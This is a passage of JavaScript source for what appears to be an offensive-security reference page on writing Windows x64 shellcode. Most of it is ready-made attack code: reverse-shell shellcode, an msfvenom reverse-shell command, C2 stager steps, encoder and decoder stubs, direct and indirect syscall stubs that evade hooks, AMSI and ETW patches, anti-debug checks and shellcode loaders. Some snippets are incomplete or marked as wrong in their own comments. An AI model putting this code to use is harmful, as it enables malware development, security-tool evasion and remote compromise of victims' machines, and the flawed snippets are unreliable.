{n:"Donut",d:"Converts .NET assemblies, EXE, DLL to position-independent shellcode. Supports AMSI/WLDP bypass, compression, encryption.",c:"#fbbf24"},
{n:"sRDI",d:"Shellcode Reflective DLL Injection. Converts any DLL to PIC shellcode with reflective loader prepended.",c:"#f87171"},
{n:"PEzor",d:"Packer/shellcode generator. LLVM-based obfuscation. Supports SGN encoding, sleep obfuscation, syscalls.",c:"#e879f9"},
{n:"msfvenom",d:"Metasploit payload generator. msfvenom -p windows/x64/shell_reverse_tcp -f raw -o shell.bin. Good for prototyping.",c:"#f59e0b"},
{n:"objdump / xxd",d:"objdump -d -M intel: disassemble. xxd -i: C array output. xxd -p: hex dump. Essential for inspection.",c:"#f472b6"}
];
tools.forEach(function(t){h+='<div style="border-radius:6px;border:1px solid '+t.c+'20;background:'+t.c+'06;padding:5px 8px"><div style="font-weight:700;color:'+t.c+';font-size:.72em">'+t.n+'</div><div style="font-size:.64em;color:#9ca3af;margin-top:1px">'+t.d+'</div></div>';});
h+='</div>';
h+='<div style="margin-top:10px">';
h+=CRD("\u{1F527}","Essential Debug Workflow","#f472b6",F("1.","Assemble: nasm -f win64 sc.asm -o sc.o","",true)+F("2.","Extract: objcopy -O binary -j .text sc.o sc.bin","",true)+F("3.","Inspect: xxd sc.bin | grep '00' (find null bytes)","",true)+F("4.","Disasm: objdump -b binary -m i386:x86-64 -D sc.bin","",true)+F("5.","Test: load sc.bin into harness (VirtualAlloc+memcpy+call)","",true)+F("6.","Debug: x64dbg, set breakpoint at shellcode entry (0xCC patch or hardware BP)","",true)+F("7.","Verify PIC: run from different base address (should work identically)",""));
h+='</div>';return h;
}
function fADV(){
var h='<div style="font-size:.72em;font-weight:800;color:#fb923c;letter-spacing:.06em;margin-bottom:6px">ADVANCED SHELLCODE TRICKS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F525}","Self-Modifying Shellcode","#fb923c",F("","Shellcode modifies its own instructions during execution","",true)+F("","Use: decode next block, execute, re-encode, decode following block","",true)+F("","Only small window of decoded instructions visible at any time","",true)+F("","Defeats: memory scanning that looks for decoded payload","",true)+F("","Requires: RWX memory (or VirtualProtect dance per block)",""));
h+=CRD("\u{1F3AF}","Environmental Keying","#fb923c",F("","Shellcode only executes on intended target","",true)+F("","Key derivation: hash of hostname, domain, username, MAC address","",true)+F("","Payload encrypted with environmental key","",true)+F("","Wrong environment = wrong key = garbage decryption = crash/exit","",true)+F("","Guarantees: sandbox gets nothing; only real target decrypts payload",""));
h+=CRD("\u{1F504}","Hash-Based Control Flow","#fb923c",F("","Replace direct function calls with hash dispatch","",true)+F("","Build dispatch table: hash \u2192 resolved function pointer","",true)+F("","Call by hash: lookup in table, indirect call","",true)+F("","Obfuscates: which APIs are called (no strings, no import names)","",true)+F("","Combined with API hashing: double-indirection for analysis resistance",""));
h+=CRD("\u{1F4BB}","PIC-C Patterns (C as Shellcode)","#fb923c",F("","Write shellcode in C, compile to PIC with special flags","",true)+F("","-fPIC -fno-stack-protector -nostdlib -Wl,-e,entry","",true)+F("","All API calls via function pointers resolved from PEB","",true)+F("","Strings on stack (char s[] = {'k','e','r',...,0};)","",true)+F("","Benefits: complex logic without manual ASM; still position-independent",""));
h+=CRD("\u{1F9F1}","Custom C2 Stager","#fb923c",F("","Minimal shellcode that establishes C2 channel and loads next stage","",true)+F("1.","Resolve: socket/connect or WinHTTP APIs","",true)+F("2.","Connect to C2, send check-in (host info, user, PID)","",true)+F("3.","Receive next-stage shellcode (encrypted)","",true)+F("4.","Decrypt with pre-shared or negotiated key","",true)+F("5.","VirtualAlloc RWX, copy, execute","",true)+F("","Keep stager < 2KB for injection buffer constraints",""));
h+=CRD("\u{1F3AD}","Reflective DLL Bootstrap","#fb923c",F("","Tiny shellcode stub that bootstraps reflective DLL loading","",true)+F("","Stub: find DLL appended after stub in memory","",true)+F("","Parse PE headers, allocate memory, copy sections","",true)+F("","Process relocations, resolve imports","",true)+F("","Call DllMain(DLL_PROCESS_ATTACH)","",true)+F("","sRDI automates this; understanding internals helps customization",""));
h+='</div>';return h;
}
function getCodes(s){
var C={};
C.pic=[
{t:"Stack string construction (x64 NASM)",l:"asm",c:"; Build \"kernel32.dll\" on stack (null-terminated)\n; Technique: push 8-byte chunks in reverse\n\n    xor rax, rax                ; rax = 0\n    push rax                    ; null terminator on stack\n\n    ; \"kernel32.dll\" = 6B 65 72 6E 65 6C 33 32 2E 64 6C 6C\n    mov rax, 0x6C6C642E3233     ; \"32.dll\" (6 bytes, padded)\n    push rax\n    mov rax, 0x6C656E72656B     ; \"kernel\" (6 bytes)\n    push rax\n    mov rcx, rsp                ; rcx -> \"kernel32.dll\"\n\n    ; Alternative: direct stack writes (avoids push alignment issues)\n    sub rsp, 0x20\n    mov dword [rsp],    0x6E72656B  ; \"kern\"\n    mov dword [rsp+4],  0x32336C65  ; \"el32\"\n    mov dword [rsp+8],  0x6C6C642E  ; \".dll\"\n    mov byte  [rsp+12], 0           ; null terminator\n    lea rcx, [rsp]                  ; rcx -> string\n\n    ; Note: verify no null bytes in immediates\n    ; If present: XOR-encode and decode in place"},
{t:"Null-free register zeroing and small values",l:"asm",c:"; Zero a register without null bytes\n    xor eax, eax            ; 31 C0 (2 bytes, no nulls)\n    ; NOT: mov rax, 0       ; 48 C7 C0 00 00 00 00 (contains nulls)\n\n; Small values without null bytes\n    xor ecx, ecx\n    mov cl, 2               ; ecx = 2 (B1 02, no nulls)\n    ; NOT: mov ecx, 2       ; B9 02 00 00 00 (three null bytes)\n\n; Push null onto stack\n    xor eax, eax\n    push rax                ; pushes 8 zero bytes\n\n; Set specific value with XOR trick\n    xor eax, eax\n    mov al, 0xFF            ; eax = 0xFF\n    xor al, 0x9D            ; eax = 0x62 (if you need 0x62 but want to hide it)\n\n; Conditional null avoidance for addresses\n    lea rax, [rcx + 0x60]  ; offset from known base\n    ; NOT: mov rax, 0x00007FFE0060  (absolute, contains nulls)\n\n; Verify: nasm -f win64 sc.asm -o sc.o && objdump -d sc.o | grep ' 00'"}
];
C.api=[
{t:"Complete PEB walk: find kernel32 base (x64 NASM)",l:"asm",c:"; PEB Walk - Resolve kernel32.dll base address (x64)\n; Uses InMemoryOrderModuleList\n\nfind_kernel32:\n    xor rax, rax\n    mov rax, gs:[rax+0x60]      ; RAX = PEB\n    mov rax, [rax+0x18]         ; RAX = PEB->Ldr (PEB_LDR_DATA)\n    mov rsi, [rax+0x20]         ; RSI = InMemoryOrderModuleList.Flink\n    ; 1st entry = current EXE\n    lodsq                       ; RAX = 2nd entry (ntdll.dll), RSI advances\n    xchg rax, rsi               ; RSI = ntdll entry\n    lodsq                       ; RAX = 3rd entry (kernel32.dll)\n    mov rbx, [rax+0x20]         ; RBX = kernel32.DllBase\n    ; Note: +0x20 from InMemoryOrder Flink = DllBase\n    ; (LDR_DATA_TABLE_ENTRY.DllBase offset from InMemoryOrderLinks)\n    ret\n\n    ; RBX now holds kernel32.dll base address\n    ; Next: walk export table to find GetProcAddress / LoadLibraryA"},
{t:"Export table walk with ROR13 hash (x64 NASM)",l:"asm",c:"; Walk export table and find function by ROR13 hash\n; Input: RBX = module base, R12D = target hash\n; Output: RAX = function address\n\nfind_function:\n    mov eax, [rbx+0x3C]            ; e_lfanew\n    mov edx, [rbx+rax+0x88]        ; Export Directory RVA (x64 offset)\n    add rdx, rbx                    ; Export Directory VA\n    mov ecx, [rdx+0x18]            ; NumberOfNames\n    mov r8d, [rdx+0x20]            ; AddressOfNames RVA\n    add r8, rbx                     ; AddressOfNames VA\n\nsearch_loop:\n    dec ecx\n    js not_found                    ; all names checked\n    mov esi, [r8+rcx*4]            ; Name RVA\n    add rsi, rbx                    ; Name VA\n\n    ; Compute ROR13 hash of function name\n    xor edi, edi                    ; hash = 0\nhash_loop:\n    lodsb                           ; al = next char\n    test al, al\n    jz hash_done\n    ror edi, 13                     ; rotate right 13\n    add edi, eax                    ; hash += char\n    jmp hash_loop\nhash_done:\n    cmp edi, r12d                   ; compare with target hash\n    jnz search_loop                 ; no match, next name\n\n    ; Found! Get function address\n    mov r8d, [rdx+0x24]            ; AddressOfNameOrdinals RVA\n    add r8, rbx\n    movzx ecx, word [r8+rcx*2]     ; ordinal\n    mov r8d, [rdx+0x1C]            ; AddressOfFunctions RVA\n    add r8, rbx\n    mov eax, [r8+rcx*4]            ; function RVA\n    add rax, rbx                    ; function VA\n    ret\n\nnot_found:\n    xor eax, eax\n    ret"},
{t:"Combined: resolve GetProcAddress + LoadLibraryA",l:"asm",c:"; Full bootstrap: PEB walk -> find GetProcAddress -> find LoadLibraryA\n; After this, any API can be resolved\n\n_start:\n    ; Save non-volatile registers\n    push rbx\n    push rdi\n    push rsi\n    push rbp\n    push r12\n    push r13\n    sub rsp, 0x28               ; shadow space + alignment\n\n    ; Step 1: Find kernel32 base\n    xor rax, rax\n    mov rax, gs:[rax+0x60]      ; PEB\n    mov rax, [rax+0x18]         ; Ldr\n    mov rsi, [rax+0x20]         ; InMemoryOrderModuleList\n    lodsq                       ; skip exe\n    xchg rax, rsi\n    lodsq                       ; skip ntdll\n    mov rbx, [rax+0x20]         ; kernel32 base\n\n    ; Step 2: Find GetProcAddress (hash: 0x7C0DFCAA)\n    mov r12d, 0x7C0DFCAA\n    call find_function           ; RAX = GetProcAddress\n    mov r13, rax                 ; R13 = GetProcAddress\n\n    ; Step 3: Resolve LoadLibraryA via GetProcAddress\n    ; Build \"LoadLibraryA\" on stack\n    xor rax, rax\n    push rax\n    mov rax, 0x41797261         ; \"aryA\"\n    push rax\n    mov rax, 0x7262694C64616F4C ; \"LoadLibr\"\n    push rax\n    mov rdx, rsp                ; rdx = \"LoadLibraryA\"\n    mov rcx, rbx                ; rcx = kernel32 base\n    call r13                    ; GetProcAddress(kernel32, \"LoadLibraryA\")\n    mov rbp, rax                ; RBP = LoadLibraryA\n\n    ; Now: R13 = GetProcAddress, RBP = LoadLibraryA\n    ; Resolve any API:\n    ;   LoadLibraryA(\"ws2_32.dll\") for sockets\n    ;   GetProcAddress(hMod, \"WSAStartup\") etc."}
];
C.pat=[
{t:"Reverse shell shellcode (x64, complete)",l:"asm",c:"; x64 Windows Reverse Shell Shellcode (simplified structure)\n; Assumes: R13 = GetProcAddress, RBP = LoadLibraryA (from bootstrap)\n\nreverse_shell:\n    ; Load ws2_32.dll\n    xor rax, rax\n    push rax\n    mov rax, 0x6C6C642E32335F327377  ; Not right - build properly:\n    ; Build \"ws2_32.dll\" on stack\n    sub rsp, 0x10\n    mov dword [rsp],   0x5F327377   ; \"ws2_\"\n    mov dword [rsp+4], 0x642E3233   ; \"32.d\"\n    mov dword [rsp+8], 0x006C6C     ; \"ll\\0\"\n    lea rcx, [rsp]\n    call rbp                         ; LoadLibraryA(\"ws2_32.dll\")\n    mov r14, rax                     ; R14 = ws2_32 base\n\n    ; Resolve WSAStartup\n    mov rcx, r14\n    lea rdx, [rip+str_WSAStartup]    ; or build on stack\n    call r13                         ; GetProcAddress\n    ; ... resolve WSASocketA, connect similarly\n\n    ; WSAStartup(0x0202, &wsadata)\n    sub rsp, 0x200                   ; WSADATA on stack\n    mov rcx, 0x0202\n    lea rdx, [rsp]\n    call rax                         ; WSAStartup\n\n    ; WSASocketA(AF_INET=2, SOCK_STREAM=1, 0, 0, 0, 0)\n    xor r9, r9\n    push r9                          ; dwFlags = 0\n    push r9                          ; g = 0\n    mov r8, r9                       ; protocol = 0\n    mov edx, 1                       ; SOCK_STREAM\n    mov ecx, 2                       ; AF_INET\n    call [resolved_WSASocketA]\n    mov r12, rax                     ; R12 = socket\n\n    ; connect(sock, &sockaddr_in, 16)\n    ; Build sockaddr_in: AF_INET(2) + port(big-endian) + IP\n    xor rax, rax\n    push rax                         ; padding\n    mov eax, 0x0100007F              ; 127.0.0.1 (change for target)\n    push rax\n    mov ax, 0x5C11                   ; port 4444 big-endian (0x115C)\n    shl eax, 16\n    or eax, 2                        ; AF_INET\n    push rax\n    mov rdx, rsp                     ; &sockaddr_in\n    mov ecx, r12d                    ; socket\n    mov r8d, 16                      ; sizeof(sockaddr_in)\n    call [resolved_connect]"},
{t:"Egghunter stub (x64, NtAccessCheckAndAuditAlarm)",l:"asm",c:"; x64 Egghunter - searches memory for egg tag\n; Egg: 8-byte marker prepended to real shellcode\n; Size: ~40 bytes\n\negghunter:\n    xor rsi, rsi                ; RSI = 0 (start address)\n\nnext_page:\n    or si, 0xFFF                ; align to page boundary - 1\n\nnext_addr:\n    inc rsi                     ; next byte\n\n    ; Probe memory with NtAccessCheckAndAuditAlarm\n    ; If page is unreadable, STATUS_ACCESS_VIOLATION returned\n    ; (doesn't crash like direct read would)\n    xor rax, rax\n    mov al, 0x29                ; NtAccessCheckAndAuditAlarm SSN (varies!)\n    mov r10, rcx\n    mov rdx, rsi                ; address to probe\n    syscall\n    cmp al, 5                   ; STATUS_ACCESS_VIOLATION?\n    je next_page                ; skip this page\n\n    ; Page readable - check for egg\n    mov rdi, 0x5077304E5077304E ; egg = \"N0wPN0wP\" (example, doubled)\n    cmp [rsi], rdi\n    jnz next_addr\n\n    ; Egg found! Jump to shellcode (after egg)\n    lea rax, [rsi+8]            ; skip egg tag\n    jmp rax"}
];
C.enc=[
{t:"XOR decoder stub (x64 NASM)",l:"asm",c:"; Single-byte XOR decoder stub\n; Decodes payload in-place, then falls through to it\n\ndecoder_stub:\n    jmp get_payload_addr\n\ndecode:\n    pop rsi                     ; RSI = address of encoded payload\n    xor rcx, rcx\n    mov cx, PAYLOAD_LEN         ; length (avoid null if < 256: use mov cl, LEN)\n\ndecode_loop:\n    xor byte [rsi], XOR_KEY     ; XOR_KEY = single byte key\n    inc rsi\n    loop decode_loop            ; dec rcx, jnz\n\n    ; Fall through to decoded payload\n    jmp decoded_payload\n\nget_payload_addr:\n    call decode                 ; pushes addr of next instruction (payload)\n\ndecoded_payload:\n    ; Encoded payload bytes go here\n    ; db 0xAA, 0xBB, 0xCC, ...  (XOR-encoded shellcode)\n\n; --- Encoder (Python) ---\n; key = 0x41\n; encoded = bytes([b ^ key for b in raw_shellcode])\n; Verify: no byte in encoded == 0x00 (try different key if so)\n; Also verify: key itself doesn't appear in XOR_KEY instruction"},
{t:"Rolling XOR encoder/decoder",l:"asm",c:"; Rolling XOR: each byte XOR'd with previous ciphertext\n; Provides feedback cipher - defeats frequency analysis\n\nrolling_xor_decoder:\n    lea rsi, [rip+enc_payload]  ; address of encoded payload\n    xor rcx, rcx\n    mov cx, PAYLOAD_LEN\n    xor bl, bl                  ; previous byte = 0 (initial key)\n\n.loop:\n    mov al, [rsi]               ; read ciphertext byte\n    mov dl, al                  ; save ciphertext (becomes next key)\n    xor al, bl                  ; decrypt: plaintext = cipher ^ prev_cipher\n    mov [rsi], al               ; write plaintext\n    mov bl, dl                  ; update key = previous ciphertext\n    inc rsi\n    loop .loop\n\n    jmp enc_payload             ; execute decoded shellcode\n\nenc_payload:\n    ; db ... (rolling-XOR encoded bytes)\n\n; --- Encoder (Python) ---\n; def rolling_xor_encode(shellcode, initial_key=0):\n;     encoded = bytearray()\n;     prev = initial_key\n;     for b in shellcode:\n;         enc_byte = b ^ prev\n;         encoded.append(enc_byte)\n;         prev = enc_byte\n;     return bytes(encoded)"},
{t:"RC4 decoder stub (x64 NASM)",l:"asm",c:"; RC4 stream cipher decoder in x64 assembly\n; Decrypts payload in-place using embedded key\n\nrc4_decrypt:\n    sub rsp, 0x110              ; 256-byte S array + workspace\n    lea rdi, [rsp]              ; RDI = S array\n\n    ; KSA - Key Scheduling Algorithm\n    xor rcx, rcx\nksa_init:                       ; S[i] = i\n    mov [rdi+rcx], cl\n    inc cl\n    jnz ksa_init\n\n    ; KSA scramble\n    xor rcx, rcx                ; i = 0\n    xor rdx, rdx                ; j = 0\n    lea r8, [rip+rc4_key]       ; key pointer\nksa_loop:\n    movzx eax, byte [rdi+rcx]  ; S[i]\n    movzx r9d, byte [r8+rcx]   ; key[i % keylen] (if keylen=16, mask rcx)\n    add dl, al\n    add dl, r9b                 ; j = (j + S[i] + key[i]) % 256\n    ; Swap S[i], S[j]\n    movzx r9d, byte [rdi+rdx]\n    mov [rdi+rcx], r9b\n    mov [rdi+rdx], al\n    inc cl\n    jnz ksa_loop\n\n    ; PRGA - decrypt payload\n    xor rcx, rcx                ; i = 0\n    xor rdx, rdx                ; j = 0\n    lea rsi, [rip+rc4_payload]  ; encrypted payload\n    xor r10, r10\n    mov r10w, PAYLOAD_LEN\n\nprga_loop:\n    inc cl                      ; i++\n    movzx eax, byte [rdi+rcx]  ; S[i]\n    add dl, al                  ; j += S[i]\n    movzx r9d, byte [rdi+rdx]\n    mov [rdi+rcx], r9b          ; swap S[i], S[j]\n    mov [rdi+rdx], al\n    add al, r9b                 ; S[i] + S[j]\n    movzx eax, byte [rdi+rax]  ; K = S[(S[i]+S[j]) % 256]\n    xor [rsi], al               ; decrypt byte\n    inc rsi\n    dec r10\n    jnz prga_loop\n\n    add rsp, 0x110\n    jmp rc4_payload             ; execute decrypted shellcode\n\nrc4_key:\n    db 0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48  ; 8-byte key example\n    db 0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,0x50\nrc4_payload:\n    ; db ... (RC4-encrypted shellcode bytes)"}
];
C.sys=[
{t:"Direct syscall stub (NtAllocateVirtualMemory)",l:"asm",c:"; Direct Syscall: NtAllocateVirtualMemory\n; Bypasses all ntdll usermode hooks\n\n; Prototype:\n; NTSTATUS NtAllocateVirtualMemory(\n;   HANDLE ProcessHandle,    // rcx (-1 = current process)\n;   PVOID *BaseAddress,      // rdx\n;   ULONG_PTR ZeroBits,      // r8\n;   PSIZE_T RegionSize,      // r9\n;   ULONG AllocationType,    // [rsp+0x28]\n;   ULONG Protect            // [rsp+0x30]\n; )\n\nNtAllocateVirtualMemory:\n    mov r10, rcx                ; syscall convention: r10 = 1st arg\n    mov eax, 0x18               ; SSN for Win10 22H2 (VERIFY!)\n    syscall\n    ret\n\n; Usage:\n    xor rcx, rcx\n    dec rcx                     ; RCX = -1 (current process)\n    lea rdx, [rsp+base_addr]    ; ptr to base (0 = let kernel choose)\n    xor r8, r8                  ; ZeroBits = 0\n    lea r9, [rsp+region_size]   ; ptr to size\n    push 0x40                   ; PAGE_EXECUTE_READWRITE\n    push 0x3000                 ; MEM_COMMIT | MEM_RESERVE\n    sub rsp, 0x20               ; shadow space\n    call NtAllocateVirtualMemory\n    add rsp, 0x30               ; cleanup (shadow + 2 pushes)"},
{t:"Indirect syscall (with gadget finder)",l:"asm",c:"; Indirect Syscall: execute syscall instruction inside ntdll\n; Avoids: shellcode address in kernel return address check\n\n; Step 1: Find ntdll base via PEB\nfind_ntdll:\n    xor rax, rax\n    mov rax, gs:[rax+0x60]      ; PEB\n    mov rax, [rax+0x18]         ; Ldr\n    mov rsi, [rax+0x20]         ; InMemoryOrderModuleList\n    lodsq                       ; skip exe\n    xchg rax, rsi\n    lodsq                       ; RAX = ntdll entry\n    mov r15, [rax+0x20]         ; R15 = ntdll.dll base\n\n; Step 2: Find \"syscall; ret\" gadget (0F 05 C3) in ntdll\nfind_syscall_ret:\n    mov rdi, r15                ; start of ntdll\n    mov ecx, 0x100000           ; search range (1MB)\n.scan:\n    cmp word [rdi], 0x050F      ; syscall (0F 05)\n    jne .next\n    cmp byte [rdi+2], 0xC3     ; ret (C3)\n    je .found\n.next:\n    inc rdi\n    loop .scan\n    ; Fallback: direct syscall if gadget not found\n.found:\n    mov r14, rdi                ; R14 = syscall;ret gadget address\n\n; Step 3: Indirect syscall\nindirect_NtAllocateVirtualMemory:\n    mov r10, rcx\n    mov eax, 0x18               ; SSN\n    jmp r14                     ; jump to syscall;ret in ntdll\n    ; Return address on stack points to our code\n    ; But kernel sees: RIP was inside ntdll when syscall executed"},
{t:"Hell's Gate SSN resolution (x64)",l:"asm",c:"; Hell's Gate: Read SSN directly from ntdll function stub\n; Even if hooked, the SSN bytes are usually preserved\n;\n; ntdll stub structure:\n; 4C 8B D1      mov r10, rcx\n; B8 XX XX 00 00  mov eax, SSN  <-- we want XX XX\n; (EDR hook may replace first bytes with JMP)\n\nhellos_gate_resolve:\n    ; Input: RAX = address of Nt* function in ntdll\n    ; Output: EAX = SSN\n\n    ; Check if function starts with \"mov r10, rcx\" (4C 8B D1)\n    cmp byte [rax], 0x4C\n    jne check_hooked\n    cmp byte [rax+1], 0x8B\n    jne check_hooked\n    cmp byte [rax+2], 0xD1\n    jne check_hooked\n\n    ; Not hooked - read SSN directly\n    mov eax, [rax+4]            ; SSN at offset +4\n    ret\n\ncheck_hooked:\n    ; Function is hooked (JMP instruction at start)\n    ; Halo's Gate: walk to neighbor functions\n    ; Each syscall stub is 0x20 bytes apart\n    ; Try func+0x20 (next syscall), SSN = neighbor_SSN - 1\n    ; Try func-0x20 (prev syscall), SSN = neighbor_SSN + 1\n\n    mov rbx, rax                ; save original func addr\n    xor rcx, rcx\n    inc ecx                     ; start with offset 1\n\n.walk_down:\n    lea rdi, [rbx+rcx*0x20]    ; next neighbor\n    cmp byte [rdi], 0x4C       ; check if neighbor is clean\n    jne .try_up\n    mov eax, [rdi+4]           ; neighbor SSN\n    sub eax, ecx               ; our SSN = neighbor - distance\n    ret\n\n.try_up:\n    lea rdi, [rbx-rcx*0x20]    ; previous neighbor\n    cmp byte [rdi], 0x4C\n    jne .next_neighbor\n    mov eax, [rdi+4]           ; neighbor SSN\n    add eax, ecx               ; our SSN = neighbor + distance\n    ret\n\n.next_neighbor:\n    inc ecx\n    cmp ecx, 0x20              ; max 32 neighbors\n    jl .walk_down\n    xor eax, eax               ; failed\n    ret"}
];
C.evd=[
{t:"ETW patch stub (x64 ASM)",l:"asm",c:"; Patch EtwEventWrite to immediately return\n; Silences all ETW tracing from this process\n\npatch_etw:\n    ; Assume: R13 = GetProcAddress, R15 = ntdll base\n\n    ; Find EtwEventWrite\n    mov rcx, r15                ; ntdll base\n    ; Build \"EtwEventWrite\" on stack\n    sub rsp, 0x20\n    mov rax, 0x7469727745       ; \"Ewrit\" (partial)\n    ; ... (build full string or use hash-based resolution)\n    ; For brevity, assume resolved to RAX:\n\n    ; VirtualProtect to make writable\n    ; (resolve VirtualProtect from kernel32 first)\n    sub rsp, 0x28\n    lea r9, [rsp+0x20]         ; lpflOldProtect\n    mov r8d, 0x40               ; PAGE_EXECUTE_READWRITE\n    mov edx, 1                  ; size = 1 byte\n    mov rcx, rax                ; EtwEventWrite address\n    call [resolved_VirtualProtect]\n\n    ; Patch: write 0xC3 (ret) as first byte\n    mov byte [rax], 0xC3\n\n    ; Restore protection\n    sub rsp, 0x28\n    lea r9, [rsp+0x20]\n    mov r8d, 0x20               ; PAGE_EXECUTE_READ\n    mov edx, 1\n    mov rcx, rax\n    call [resolved_VirtualProtect]"},
{t:"AMSI patch stub (x64 ASM)",l:"asm",c:"; Patch AmsiScanBuffer to return E_INVALIDARG\n; Bypasses AMSI scanning for PowerShell, .NET, etc.\n\npatch_amsi:\n    ; Load amsi.dll (may not be loaded yet)\n    ; Build \"amsi.dll\" on stack\n    sub rsp, 0x10\n    mov dword [rsp], 0x69736D61     ; \"amsi\"\n    mov dword [rsp+4], 0x6C6C642E   ; \".dll\"\n    mov byte [rsp+8], 0\n    lea rcx, [rsp]\n    call rbp                         ; LoadLibraryA(\"amsi.dll\")\n    test rax, rax\n    jz .done                         ; amsi.dll not available\n    mov r14, rax                     ; amsi base\n\n    ; Find AmsiScanBuffer\n    mov rcx, r14\n    ; ... resolve via GetProcAddress (build string or use hash)\n    ; Result in RAX = AmsiScanBuffer address\n\n    ; VirtualProtect RWX\n    ; ... (same pattern as ETW patch)\n\n    ; Write patch: mov eax, 0x80070057; ret\n    ; Bytes: B8 57 00 07 80 C3\n    mov dword [rax], 0x070057B8      ; B8 57 00 07 80 (little-endian partial)\n    mov byte [rax+4], 0x80\n    mov byte [rax+5], 0xC3           ; ret\n\n    ; Restore protection\n    ; ...\n.done:"},
{t:"Anti-debug: PEB + timing check (x64 ASM)",l:"asm",c:"; Combined anti-debug checks\n; If debugger detected: exit cleanly\n\nanti_debug:\n    ; Check 1: PEB.BeingDebugged\n    xor rax, rax\n    mov rax, gs:[rax+0x60]      ; PEB\n    cmp byte [rax+0x02], 0      ; BeingDebugged\n    jne .debugger_found\n\n    ; Check 2: PEB.NtGlobalFlag\n    mov eax, [rax+0xBC]         ; NtGlobalFlag\n    and eax, 0x70               ; FLG_HEAP_ENABLE_TAIL_CHECK |\n                                ; FLG_HEAP_ENABLE_FREE_CHECK |\n                                ; FLG_HEAP_VALIDATE_PARAMETERS\n    cmp eax, 0x70\n    je .debugger_found\n\n    ; Check 3: RDTSC timing\n    rdtsc\n    shl rdx, 32\n    or rax, rdx\n    mov rbx, rax                ; save start time\n    ; ... execute some instructions ...\n    nop\n    nop\n    rdtsc\n    shl rdx, 32\n    or rax, rdx\n    sub rax, rbx                ; delta\n    cmp rax, 0x100000           ; threshold (tune this)\n    ja .debugger_found          ; too slow = single-stepping\n\n    ; No debugger - continue execution\n    jmp .clean\n\n.debugger_found:\n    ; Clean exit or decoy behavior\n    xor ecx, ecx\n    call [resolved_ExitProcess]  ; or: jmp to benign code\n\n.clean:\n    ; Continue with real shellcode\n    nop"}
];
C.ldr=[
{t:"Shellcode loader harness (C, for testing)",l:"c",c:"// Minimal shellcode test harness\n// Loads raw shellcode from file into RWX memory and executes\n\n#include <windows.h>\n#include <stdio.h>\n\nint main(int argc, char* argv[]) {\n    if (argc < 2) { printf(\"Usage: loader.exe shellcode.bin\\n\"); return 1; }\n\n    // Read shellcode from file\n    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL,\n        OPEN_EXISTING, 0, NULL);\n    DWORD size = GetFileSize(hFile, NULL);\n    \n    // Allocate RWX memory\n    LPVOID mem = VirtualAlloc(NULL, size,\n        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    \n    // Copy shellcode\n    DWORD bytesRead;\n    ReadFile(hFile, mem, size, &bytesRead, NULL);\n    CloseHandle(hFile);\n    \n    printf(\"[+] Shellcode loaded at %p (%d bytes)\\n\", mem, size);\n    printf(\"[+] Press Enter to execute...\\n\");\n    getchar();  // Pause for debugger attach\n    \n    // Execute via function pointer\n    ((void(*)())mem)();\n    \n    // Alternative execution methods:\n    // Callback: EnumFonts(GetDC(0), NULL, (FONTENUMPROC)mem, 0);\n    // Thread:  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);\n    // Fiber:   ConvertThreadToFiber(0); SwitchToFiber(CreateFiber(0, mem, 0));\n    // APC:     QueueUserAPC((PAPCFUNC)mem, GetCurrentThread(), 0);\n    \n    VirtualFree(mem, 0, MEM_RELEASE);\n    return 0;\n}"},
{t:"Callback-based execution (C, multiple methods)",l:"c",c:"// Execute shellcode via Windows callbacks (no CreateThread)\n// Each method uses a different API that accepts a function pointer\n\n#include <windows.h>\n\nvoid exec_via_callback(LPVOID shellcode) {\n    \n    // Method 1: EnumFontFamilies\n    EnumFontFamiliesA(GetDC(0), NULL,\n        (FONTENUMPROCA)shellcode, 0);\n    \n    // Method 2: EnumWindows\n    // EnumWindows((WNDENUMPROC)shellcode, 0);\n    \n    // Method 3: CreateTimerQueueTimer\n    // HANDLE hTimer, hQueue = CreateTimerQueue();\n    // CreateTimerQueueTimer(&hTimer, hQueue,\n    //     (WAITORTIMERCALLBACK)shellcode, NULL, 0, 0,\n    //     WT_EXECUTEINTIMERTHREAD);\n    // WaitForSingleObject(hTimer, INFINITE);\n    \n    // Method 4: CertEnumSystemStore\n    // CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER,\n    //     NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)shellcode);\n    \n    // Method 5: EnumDesktops\n    // EnumDesktopsA(GetProcessWindowStation(),\n    //     (DESKTOPENUMPROCA)shellcode, 0);\n    \n    // Method 6: SetTimer (message-based)\n    // SetTimer(0, 0, 0, (TIMERPROC)shellcode);\n    // MSG msg; GetMessageA(&msg, 0, 0, 0);\n    // DispatchMessageA(&msg);\n}"}
];
C.kit=[
{t:"Build, extract, test shellcode (bash workflow)",l:"bash",c:"# === ASSEMBLE ===\n# NASM (primary):\nnasm -f win64 shellcode.asm -o shellcode.o\n\n# FASM (produces raw binary directly):\n# In shellcode.asm: \"format binary\" at top\nfasm shellcode.asm shellcode.bin\n\n# === EXTRACT .text section (NASM output) ===\nobjcopy -O binary -j .text shellcode.o shellcode.bin\n\n# === INSPECT ===\n# Disassemble raw binary:\nobjdump -b binary -m i386:x86-64 -M intel -D shellcode.bin\n\n# Check for null bytes:\nxxd shellcode.bin | grep \" 00\"\n\n# Size:\nwc -c shellcode.bin\n\n# Hex dump for C array:\nxxd -i shellcode.bin > shellcode.h\n\n# Hex string (one line):\nxxd -p shellcode.bin | tr -d '\\n'\n\n# === ENCODE ===\n# Single-byte XOR:\npython3 -c \"\nimport sys\nkey = 0x41\nsc = open('shellcode.bin','rb').read()\nenc = bytes([b ^ key for b in sc])\nassert 0 not in enc, 'Null byte in encoded output! Try different key'\nopen('encoded.bin','wb').write(enc)\nprint(f'Encoded {len(enc)} bytes with key 0x{key:02x}')\n\"\n\n# === TEST ===\n# Compile harness:\nx86_64-w64-mingw32-gcc loader.c -o loader.exe\n# Run: loader.exe shellcode.bin\n\n# === CONVERT (existing PE/DLL to shellcode) ===\n# Donut:\ndonut.exe -i payload.exe -o payload.bin\n# sRDI:\npython3 sRDI/ConvertToShellcode.py payload.dll"}
];
C.adv=[
